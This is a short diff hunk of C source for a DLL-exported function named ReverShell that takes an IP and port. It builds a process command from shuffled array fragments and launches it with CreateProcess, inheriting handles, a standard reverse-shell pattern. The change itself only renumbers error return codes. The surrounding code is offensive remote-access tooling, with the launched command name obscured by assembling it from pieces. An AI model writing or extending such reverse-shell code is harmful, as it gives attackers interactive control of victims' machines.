@@ -35,12 +35,12 @@ int DLL_EXPORT ReverShell(char* ip, int port)
         char command[8] = "";
         snprintf(command,8, "%s%s%s%s", myArray[3], myArray[0], myArray[1], myArray[2]);
         if(!CreateProcess(NULL, command, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info))
-            return -1;
+            return -2;
         memset(command,0,8);
         return 0;
     }
     else
-        return -2;
+        return -3;
 }
 #ifdef __cplusplus
 extern "C"
